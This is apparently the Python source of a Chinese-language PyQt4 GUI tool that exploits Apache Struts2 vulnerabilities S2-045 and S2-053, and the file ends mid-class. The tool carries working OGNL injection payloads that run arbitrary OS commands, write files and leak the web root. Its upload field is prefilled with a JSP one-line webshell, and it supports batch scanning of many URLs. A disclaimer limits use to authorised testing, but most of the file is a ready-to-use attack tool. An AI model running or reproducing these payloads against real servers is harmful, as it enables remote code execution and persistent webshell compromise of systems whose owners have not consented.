# -*- coding: utf-8 -*-

# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'E:\CodeProject\PyQtProject\Struts\untitled.ui'
#
# Created by: PyQt4 UI code generator 4.11.4
#
# WARNING! All changes made in this file will be lost!

from PyQt4 import QtCore, QtGui

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName(_fromUtf8("MainWindow"))
        MainWindow.resize(710, 511)
        self.centralwidget = QtGui.QWidget(MainWindow)
        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
        self.label = QtGui.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(10, 10, 31, 21))
        self.label.setObjectName(_fromUtf8("label"))
        self.lineEdit_url = QtGui.QLineEdit(self.centralwidget)
        self.lineEdit_url.setGeometry(QtCore.QRect(40, 10, 601, 21))
        self.lineEdit_url.setObjectName(_fromUtf8("lineEdit_url"))
        self.tabWidget = QtGui.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(0, 40, 711, 451))
        self.tabWidget.setObjectName(_fromUtf8("tabWidget"))
        self.tab_test = QtGui.QWidget()
        self.tab_test.setObjectName(_fromUtf8("tab_test"))
        self.text_info = QtGui.QTextEdit(self.tab_test)
        self.text_info.setGeometry(QtCore.QRect(0, 0, 711, 431))
        self.text_info.setReadOnly(True)
        self.text_info.setObjectName(_fromUtf8("text_info"))
        self.tabWidget.addTab(self.tab_test, _fromUtf8(""))
        self.tab_cmd = QtGui.QWidget()
        self.tab_cmd.setObjectName(_fromUtf8("tab_cmd"))
        self.pushButton_cmd = QtGui.QPushButton(self.tab_cmd)
        self.pushButton_cmd.setGeometry(QtCore.QRect(630, 10, 71, 21))
        self.pushButton_cmd.setObjectName(_fromUtf8("pushButton_cmd"))
        self.label_2 = QtGui.QLabel(self.tab_cmd)
        self.label_2.setGeometry(QtCore.QRect(10, 10, 31, 20))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.lineEdit_cmd = QtGui.QLineEdit(self.tab_cmd)
        self.lineEdit_cmd.setGeometry(QtCore.QRect(50, 10, 571, 21))
        self.lineEdit_cmd.setObjectName(_fromUtf8("lineEdit_cmd"))
        self.text_cmd = QtGui.QTextEdit(self.tab_cmd)
        self.text_cmd.setGeometry(QtCore.QRect(0, 40, 711, 391))
        self.text_cmd.setReadOnly(True)
        self.text_cmd.setObjectName(_fromUtf8("text_cmd"))
        self.tabWidget.addTab(self.tab_cmd, _fromUtf8(""))
        self.tab_upload = QtGui.QWidget()
        self.tab_upload.setObjectName(_fromUtf8("tab_upload"))
        self.lineEdit_upload = QtGui.QLineEdit(self.tab_upload)
        self.lineEdit_upload.setGeometry(QtCore.QRect(80, 10, 541, 21))
        self.lineEdit_upload.setObjectName(_fromUtf8("lineEdit_upload"))
        self.pushButton_upload = QtGui.QPushButton(self.tab_upload)
        self.pushButton_upload.setGeometry(QtCore.QRect(630, 10, 71, 21))
        self.pushButton_upload.setObjectName(_fromUtf8("pushButton_upload"))
        self.pushButton_getpath = QtGui.QPushButton(self.tab_upload)
        self.pushButton_getpath.setGeometry(QtCore.QRect(0, 10, 71, 21))
        self.pushButton_getpath.setObjectName(_fromUtf8("pushButton_getpath"))
        self.text_upload = QtGui.QPlainTextEdit(self.tab_upload)
        self.text_upload.setGeometry(QtCore.QRect(0, 40, 711, 391))
        self.text_upload.setObjectName(_fromUtf8("text_upload"))
        self.tabWidget.addTab(self.tab_upload, _fromUtf8(""))
        self.tab_all = QtGui.QWidget()
        self.tab_all.setObjectName(_fromUtf8("tab_all"))
        self.pushButton_allload = QtGui.QPushButton(self.tab_all)
        self.pushButton_allload.setGeometry(QtCore.QRect(0, 0, 75, 21))
        self.pushButton_allload.setObjectName(_fromUtf8("pushButton_allload"))
        self.pushButton_alltest = QtGui.QPushButton(self.tab_all)
        self.pushButton_alltest.setGeometry(QtCore.QRect(470, 0, 75, 21))
        self.pushButton_alltest.setObjectName(_fromUtf8("pushButton_alltest"))
        self.pushButton_allstop = QtGui.QPushButton(self.tab_all)
        self.pushButton_allstop.setGeometry(QtCore.QRect(550, 0, 75, 21))
        self.pushButton_allstop.setObjectName(_fromUtf8("pushButton_allstop"))
        self.pushButton_allexport = QtGui.QPushButton(self.tab_all)
        self.pushButton_allexport.setGeometry(QtCore.QRect(630, 0, 75, 21))
        self.pushButton_allexport.setObjectName(_fromUtf8("pushButton_allexport"))
        self.lineEdit_all = QtGui.QLineEdit(self.tab_all)
        self.lineEdit_all.setGeometry(QtCore.QRect(80, 0, 381, 21))
        self.lineEdit_all.setObjectName(_fromUtf8("lineEdit_all"))
        self.treeWidget = QtGui.QTreeWidget(self.tab_all)
        self.treeWidget.setGeometry(QtCore.QRect(0, 20, 711, 411))
        self.treeWidget.setObjectName(_fromUtf8("treeWidget"))
        self.tabWidget.addTab(self.tab_all, _fromUtf8(""))
        self.tab_setting = QtGui.QWidget()
        self.tab_setting.setObjectName(_fromUtf8("tab_setting"))
        self.groupBox = QtGui.QGroupBox(self.tab_setting)
        self.groupBox.setGeometry(QtCore.QRect(0, 250, 221, 81))
        self.groupBox.setCheckable(True)
        self.groupBox.setChecked(False)
        self.groupBox.setObjectName(_fromUtf8("groupBox"))
        self.label_3 = QtGui.QLabel(self.groupBox)
        self.label_3.setGeometry(QtCore.QRect(10, 20, 41, 16))
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.label_4 = QtGui.QLabel(self.groupBox)
        self.label_4.setGeometry(QtCore.QRect(10, 50, 41, 16))
        self.label_4.setObjectName(_fromUtf8("label_4"))
        self.lineEdit_proxyhost = QtGui.QLineEdit(self.groupBox)
        self.lineEdit_proxyhost.setGeometry(QtCore.QRect(60, 20, 151, 20))
        self.lineEdit_proxyhost.setObjectName(_fromUtf8("lineEdit_proxyhost"))
        self.lineEdit_proxyport = QtGui.QLineEdit(self.groupBox)
        self.lineEdit_proxyport.setGeometry(QtCore.QRect(60, 50, 151, 20))
        self.lineEdit_proxyport.setObjectName(_fromUtf8("lineEdit_proxyport"))
        self.groupBox_2 = QtGui.QGroupBox(self.tab_setting)
        self.groupBox_2.setGeometry(QtCore.QRect(0, 340, 221, 81))
        self.groupBox_2.setCheckable(True)
        self.groupBox_2.setChecked(False)
        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
        self.label_5 = QtGui.QLabel(self.groupBox_2)
        self.label_5.setGeometry(QtCore.QRect(10, 20, 41, 16))
        self.label_5.setObjectName(_fromUtf8("label_5"))
        self.label_6 = QtGui.QLabel(self.groupBox_2)
        self.label_6.setGeometry(QtCore.QRect(10, 50, 41, 16))
        self.label_6.setObjectName(_fromUtf8("label_6"))
        self.lineEdit_authname = QtGui.QLineEdit(self.groupBox_2)
        self.lineEdit_authname.setGeometry(QtCore.QRect(60, 20, 151, 20))
        self.lineEdit_authname.setObjectName(_fromUtf8("lineEdit_authname"))
        self.lineEdit_authpwd = QtGui.QLineEdit(self.groupBox_2)
        self.lineEdit_authpwd.setGeometry(QtCore.QRect(60, 50, 151, 20))
        self.lineEdit_authpwd.setObjectName(_fromUtf8("lineEdit_authpwd"))
        self.groupBox_3 = QtGui.QGroupBox(self.tab_setting)
        self.groupBox_3.setGeometry(QtCore.QRect(230, 10, 471, 111))
        self.groupBox_3.setCheckable(True)
        self.groupBox_3.setChecked(True)
        self.groupBox_3.setObjectName(_fromUtf8("groupBox_3"))
        self.label_7 = QtGui.QLabel(self.groupBox_3)
        self.label_7.setGeometry(QtCore.QRect(10, 50, 41, 16))
        self.label_7.setObjectName(_fromUtf8("label_7"))
        self.lineEdit_ua = QtGui.QLineEdit(self.groupBox_3)
        self.lineEdit_ua.setGeometry(QtCore.QRect(60, 20, 401, 20))
        self.lineEdit_ua.setObjectName(_fromUtf8("lineEdit_ua"))
        self.label_8 = QtGui.QLabel(self.groupBox_3)
        self.label_8.setGeometry(QtCore.QRect(30, 20, 21, 21))
        self.label_8.setObjectName(_fromUtf8("label_8"))
        self.plainTextEdit_cookie = QtGui.QPlainTextEdit(self.groupBox_3)
        self.plainTextEdit_cookie.setGeometry(QtCore.QRect(60, 50, 401, 51))
        self.plainTextEdit_cookie.setObjectName(_fromUtf8("plainTextEdit_cookie"))
        self.groupBox_4 = QtGui.QGroupBox(self.tab_setting)
        self.groupBox_4.setGeometry(QtCore.QRect(0, 10, 221, 141))
        self.groupBox_4.setCheckable(True)
        self.groupBox_4.setChecked(True)
        self.groupBox_4.setObjectName(_fromUtf8("groupBox_4"))
        self.label_9 = QtGui.QLabel(self.groupBox_4)
        self.label_9.setGeometry(QtCore.QRect(10, 20, 61, 16))
        self.label_9.setObjectName(_fromUtf8("label_9"))
        self.label_10 = QtGui.QLabel(self.groupBox_4)
        self.label_10.setGeometry(QtCore.QRect(10, 50, 61, 16))
        self.label_10.setObjectName(_fromUtf8("label_10"))
        self.comboBox = QtGui.QComboBox(self.groupBox_4)
        self.comboBox.setGeometry(QtCore.QRect(80, 20, 91, 22))
        self.comboBox.setObjectName(_fromUtf8("comboBox"))
        self.comboBox.addItem(_fromUtf8(""))
        self.comboBox.addItem(_fromUtf8(""))
        self.comboBox.addItem(_fromUtf8(""))
        self.comboBox_2 = QtGui.QComboBox(self.groupBox_4)
        self.comboBox_2.setGeometry(QtCore.QRect(80, 50, 91, 22))
        self.comboBox_2.setObjectName(_fromUtf8("comboBox_2"))
        self.comboBox_2.addItem(_fromUtf8(""))
        self.comboBox_2.addItem(_fromUtf8(""))
        self.comboBox_3 = QtGui.QComboBox(self.groupBox_4)
        self.comboBox_3.setGeometry(QtCore.QRect(80, 80, 91, 22))
        self.comboBox_3.setObjectName(_fromUtf8("comboBox_3"))
        self.comboBox_3.addItem(_fromUtf8(""))
        self.comboBox_3.addItem(_fromUtf8(""))
        self.comboBox_3.addItem(_fromUtf8(""))
        self.label_11 = QtGui.QLabel(self.groupBox_4)
        self.label_11.setGeometry(QtCore.QRect(10, 80, 61, 16))
        self.label_11.setObjectName(_fromUtf8("label_11"))
        self.label_13 = QtGui.QLabel(self.groupBox_4)
        self.label_13.setGeometry(QtCore.QRect(10, 110, 61, 16))
        self.label_13.setObjectName(_fromUtf8("label_13"))
        self.comboBox_mod = QtGui.QComboBox(self.groupBox_4)
        self.comboBox_mod.setGeometry(QtCore.QRect(80, 110, 91, 22))
        self.comboBox_mod.setObjectName(_fromUtf8("comboBox_mod"))
        self.groupBox_5 = QtGui.QGroupBox(self.tab_setting)
        self.groupBox_5.setGeometry(QtCore.QRect(0, 160, 221, 81))
        self.groupBox_5.setCheckable(True)
        self.groupBox_5.setChecked(True)
        self.groupBox_5.setObjectName(_fromUtf8("groupBox_5"))
        self.label_12 = QtGui.QLabel(self.groupBox_5)
        self.label_12.setGeometry(QtCore.QRect(10, 20, 41, 16))
        self.label_12.setObjectName(_fromUtf8("label_12"))
        self.label_14 = QtGui.QLabel(self.groupBox_5)
        self.label_14.setGeometry(QtCore.QRect(10, 50, 41, 16))
        self.label_14.setObjectName(_fromUtf8("label_14"))
        self.spinBox_threads = QtGui.QSpinBox(self.groupBox_5)
        self.spinBox_threads.setGeometry(QtCore.QRect(60, 20, 71, 22))
        self.spinBox_threads.setSingleStep(1)
        self.spinBox_threads.setProperty("value", 10)
        self.spinBox_threads.setObjectName(_fromUtf8("spinBox_threads"))
        self.spinBox_timeout = QtGui.QSpinBox(self.groupBox_5)
        self.spinBox_timeout.setGeometry(QtCore.QRect(60, 50, 71, 22))
        self.spinBox_timeout.setMaximum(300)
        self.spinBox_timeout.setSingleStep(10)
        self.spinBox_timeout.setProperty("value", 60)
        self.spinBox_timeout.setObjectName(_fromUtf8("spinBox_timeout"))
        self.tabWidget.addTab(self.tab_setting, _fromUtf8(""))
        self.pushButton_info = QtGui.QPushButton(self.centralwidget)
        self.pushButton_info.setGeometry(QtCore.QRect(650, 10, 51, 23))
        self.pushButton_info.setObjectName(_fromUtf8("pushButton_info"))
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusBar = QtGui.QStatusBar(MainWindow)
        self.statusBar.setObjectName(_fromUtf8("statusBar"))
        MainWindow.setStatusBar(self.statusBar)

        self.retranslateUi(MainWindow)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(_translate("MainWindow", "Struts2漏洞利用工具", None))
        self.label.setText(_translate("MainWindow", "地址", None))
        self.lineEdit_url.setText(_translate("MainWindow", "http://127.0.0.1/index.action", None))
        self.text_info.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt; font-weight:600; color:#df101b;\">该工具仅用来检测网站的是否存在安全漏洞，仅用作授权测试。</span></p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt; font-weight:600; color:#df101b;\">严禁用于非法途径，严禁用于商业目的，否则后果自负。</span></p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; color:#df101b;\"><br /></p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">1、点击&quot;验证&quot;，会自动检测该URL是否存在S2-045漏洞。</p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">2、上传时先点击获取路径，在路径后面加文件名称，在下面文本框中写入一句话木马，再点击写入按钮。暂时只能传小马。</p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">by：天融信广州安服工具组</p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">更新日志</p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">==========================================</p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">20170308 V0.1版 检测st2-045漏洞</p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">20170907 V0.2版 检测st2-053漏洞</p></body></html>", None))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_test), _translate("MainWindow", "验证", None))
        self.pushButton_cmd.setText(_translate("MainWindow", "执行", None))
        self.label_2.setText(_translate("MainWindow", "命令", None))
        self.lineEdit_cmd.setText(_translate("MainWindow", "whoami", None))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_cmd), _translate("MainWindow", "执行", None))
        self.pushButton_upload.setText(_translate("MainWindow", "写入", None))
        self.pushButton_getpath.setText(_translate("MainWindow", "获取路径", None))
        self.text_upload.setPlainText(_translate("MainWindow", "0<% if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes()); %>1\n"
"", None))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_upload), _translate("MainWindow", "上传", None))
        self.pushButton_allload.setText(_translate("MainWindow", "导入", None))
        self.pushButton_alltest.setText(_translate("MainWindow", "验证", None))
        self.pushButton_allstop.setText(_translate("MainWindow", "停止", None))
        self.pushButton_allexport.setText(_translate("MainWindow", "导出", None))
        self.treeWidget.headerItem().setText(0, _translate("MainWindow", "序号", None))
        self.treeWidget.headerItem().setText(1, _translate("MainWindow", "地址", None))
        self.treeWidget.headerItem().setText(2, _translate("MainWindow", "验证", None))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_all), _translate("MainWindow", "批量", None))
        self.groupBox.setTitle(_translate("MainWindow", "代理设置", None))
        self.label_3.setText(_translate("MainWindow", "主  机", None))
        self.label_4.setText(_translate("MainWindow", "端  口", None))
        self.groupBox_2.setTitle(_translate("MainWindow", "认证设置", None))
        self.label_5.setText(_translate("MainWindow", "用户名", None))
        self.label_6.setText(_translate("MainWindow", "密  码", None))
        self.groupBox_3.setTitle(_translate("MainWindow", "请求头", None))
        self.label_7.setText(_translate("MainWindow", "COOKIE", None))
        self.label_8.setText(_translate("MainWindow", "UA", None))
        self.groupBox_4.setTitle(_translate("MainWindow", "编码设置", None))
        self.label_9.setText(_translate("MainWindow", "编码方式", None))
        self.label_10.setText(_translate("MainWindow", "提交方式", None))
        self.comboBox.setItemText(0, _translate("MainWindow", "UTF8", None))
        self.comboBox.setItemText(1, _translate("MainWindow", "GBK", None))
        self.comboBox.setItemText(2, _translate("MainWindow", "GB2312", None))
        self.comboBox_2.setItemText(0, _translate("MainWindow", "POST", None))
        self.comboBox_2.setItemText(1, _translate("MainWindow", "UPLOAD", None))
        self.comboBox_3.setItemText(0, _translate("MainWindow", "+", None))
        self.comboBox_3.setItemText(1, _translate("MainWindow", "%20", None))
        self.comboBox_3.setItemText(2, _translate("MainWindow", "\\40", None))
        self.label_11.setText(_translate("MainWindow", "编码绕过", None))
        self.label_13.setText(_translate("MainWindow", "漏洞模式", None))
        self.groupBox_5.setTitle(_translate("MainWindow", "其它设置", None))
        self.label_12.setText(_translate("MainWindow", "线  程", None))
        self.label_14.setText(_translate("MainWindow", "超  时", None))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_setting), _translate("MainWindow", "设置", None))
        self.pushButton_info.setText(_translate("MainWindow", "验证", None))




from PyQt4 import QtCore, QtGui
import requests
import sys,threading

class Ognl(object):
    dm = "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"

    mb = "(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"

    md = "(#c='{cmd}').(#i=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#md=(#i?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c}))"

    ps = "(#ps=new java.lang.ProcessBuilder(#md))(#ps.redirectErrorStream(true)).(#pr=#ps.start()).(#rs=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#pr.getInputStream(),#rs)).(#rs.flush())"

    fw = "(#fw=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('{path}')))).(#fw.write('{content}')).(#fw.flush()).(#fw.close())"

    rs = "(#rs=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#rs)).(#rs.flush())"

    def __init__(self,base=''):
        self.base = base
        self.payload = []

    def make(self,it='.'):
        return self.filter(it.join(self.payload))

    @classmethod
    def filter(self,s):
        return s


class StrutsBase(object):
    method = "STRUTS"
    req = requests.Session()
    proxies = {}
    auth = ()
    timeout = 60
    url = None
    webpath = None
    headers = {
        'Cookie'    : 'STRUTS-Cookie',
        'User-Agent': 'STRUTS-Ua',
        'Accept'    : 'text/html',
        'Connection': 'close'
    }

    def __init__(self):
        self.data    = {}

    def set_data(self,k,v):
        self.data[k] = v

    @classmethod
    def set_header(self,k,v):
        self.headers[k] = v

    def send(self,url=None,data=None,headers=None,ref=True):
        if ref:self.headers['Referer'] = url
        return self.req.post(
                url = url if url else self.url,
                data = data if data else self.data,
                headers = headers if headers else self.headers,
                proxies = self.proxies,
                auth = self.auth,
                timeout = self.timeout,
                verify=False)

    def poc(self,url=None):
        return
    def exp(self,cmd):
        return 'exp'
    def upload(self,path,content='testst2',encoding='UTF-8'):
        return
    def getpath(self):
        return 'getpath'


class Struts2045(StrutsBase):
    def poc(self,url=None):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#r=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#r.println('STRUTStest'+20+45))"
            ".(#r.close())}")
        self.set_header('Content-Type',payload)
        res = self.send(url=url).text
        return 'STRUTStest2045' in res

    def exp(self,cmd):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#c='"+cmd+"')"
            ".(#i=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
            ".(#s=(#i?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c}))"
            ".(#p=new java.lang.ProcessBuilder(#s))"
            ".(#p.redirectErrorStream(true)).(#process=#p.start())"
            ".(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r))"
            ".(#r.flush())}")
        self.set_header('Content-Type',payload)
        return self.send().text

    def exp1(self,cmd):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
            ".(#o=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
            ".(#o.getExcludedPackageNames().clear())"
            ".(#o.getExcludedClasses().clear())"
            ".(#context.setMemberAccess(#dm))))"
            ".(#cmd='"+cmd+"')"
            ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
            ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
            ".(#p=new java.lang.ProcessBuilder(#cmds))"
            ".(#p.redirectErrorStream(true)).(#process=#p.start())"
            ".(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r))"
            ".(#r.flush())}")
        self.set_header('Content-Type',payload)
        return self.send().text

    def upload(self,path,content,encoding='UTF-8'):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#f=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('"+path+"'))))"
            ".(#f.write('"+content+"'))"
            ".(#f.flush())"
            ".(#f.close())"
            ".(#w.print('STRUTStest'+20+45)"
            ".(#w.close()))}")
        self.set_header('Content-Type',payload)
        res = self.send().text
        return 'STRUTStest2045' in res

    def upload1(self,path,content,encoding='UTF-8'):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
            ".(#o=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
            ".(#o.getExcludedPackageNames().clear())"
            ".(#o.getExcludedClasses().clear())"
            ".(#context.setMemberAccess(#dm))))"
            ".(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#f=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('"+path+"'))))"
            ".(#f.write('"+content+"'))"
            ".(#f.flush())"
            ".(#f.close())"
            ".(#w.print('STRUTStest'+20+45)"
            ".(#w.close()))}")
        self.set_header('Content-Type',payload)
        res = self.send().text
        return 'STRUTStest2045' in res

    def getpath(self):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#r=@org.apache.struts2.ServletActionContext@getRequest().getRealPath('/'))"
            ".(#o.println(#r))"
            ".(#o.close())}")
        self.set_header('Content-Type',payload)
        res = self.send().text
        return res.strip()

class Struts2053(StrutsBase):
    """%25{(%23dm=@ogn1.OgnIContext@DEFAULT_MEMBER_ACCESS).(%23_memberAccess?(%23_memberAccess=%23dm):((%23container=%23context ['com.opensymphony.xwork2.ActionContext.container'])(%23ogn1util=%23container.getInstance(@com.opensymphony.xwork2.ogn1.ognlUtil@class) ).(%23ogn1Util.getExcludedPackageNames().clear()).(%23ogn1Util.getExcludedClasses( ).clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd='whoami').(%23cmds={'cmd.exe','/c',%23cmd}).(%23p=new java.lang.ProcessBuilder(%23cmds))(%23p.redirectErrorStream(true)).(%23process=%23p.start()).(%23ins=%23process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(%23ins,'UTF-8'))}"""

    def poc(self,url=None):
        payload = ("%{987654321-1234567}")
        url = "?redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return '986419754' in res

    def exp(self,cmd):
        payload = ("%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#c='"+cmd+"')"
            ".(#i=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
            ".(#s=(#i?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c}))"
            ".(#p=new java.lang.ProcessBuilder(#s))"
            ".(#p.redirectErrorStream(true)).(#process=#p.start())"
            ".(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r))"
            ".(#r.flush())}").replace('%','%25').replace('#','%23')
        url = "?redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return 'STRUTStest2053' in res

    def upload(self,path,content,encoding='UTF-8'):
        payload = ("%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#f=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('"+path+"'))))"
            ".(#f.write('"+content+"'))"
            ".(#f.flush())"
            ".(#f.close())"
            ".(#w.print('STRUTStest'+20+53)"
            ".(#w.close()))}").replace('%','%25').replace('#','%23')
        url = "?=redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return 'STRUTStest2053' in res

    def getpath(self):
        payload = ("%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#r=@org.apache.struts2.ServletActionContext@getRequest().getRealPath('/'))"
            ".(#o.println(#r))"
            ".(#o.close())}").replace('%','%25').replace('#','%23')
        url = "?redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return 'STRUTStest2053' in res

class QIterThread(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)
        self.Queue   = []
        self.threads = 10
        self.timeout = 10
        self.__FLAG  = True   #stop
        self.__STAT  = False  #pause
    def run(self):
        if self.Queue and self.handler:
            self.__FLAG  = True
            self.__STAT  = False
            Qiter = iter(self.Queue)
            while self.__FLAG:
                __ = []
                if self.__STAT:
                    self.sleep(1)
                    continue
                for _ in range(self.threads):
                    try:
                        data = next(Qiter)
                    except StopIteration:
                        self.__FLAG = False
                        break
                    _Q = threading.Thread(target=self.handler,args=(data,))
                    __.append(_Q)
                for _ in __:
                    _.start()

    def stop(self):
        self.__FLAG = False
        self.__STAT = False

    def pause(self):
        self.__STAT = not self.__STAT

    def setup(self,**kwargs):
        for k,v in kwargs.items():
            setattr(self,k,v)

class EventHandler(QtGui.QMainWindow,Ui_MainWindow):
    @QtCore.pyqtSlot(str)
    def on_lineEdit_url_textChanged(self,event):
        if not str(event).startswith(('http','HTTP')):
            event='http://%s'%event
        StrutsBase.url = event
        self.updatestatus(u'更改URL地址为%s'%event)

    @QtCore.pyqtSlot(bool)
    def on_pushButton_info_clicked(self,event):
        if StrutsBase.url:
          self.text_info.setText('')
          for name,mod in self.mods.items():
            self.updatestatus(u'正在测试是否存在%s漏洞。'%name)
            if mod.poc():
                self.curmod = mod
                self.text_info.insertPlainText(u'发现%s漏洞!!!系统确定为%s漏洞模式.！\n'%(name,name))
            else:
                self.text_info.insertPlainText(u'未发现%s漏洞\n'%name)
          self.updatestatus(u'')

    @QtCore.pyqtSlot(bool)
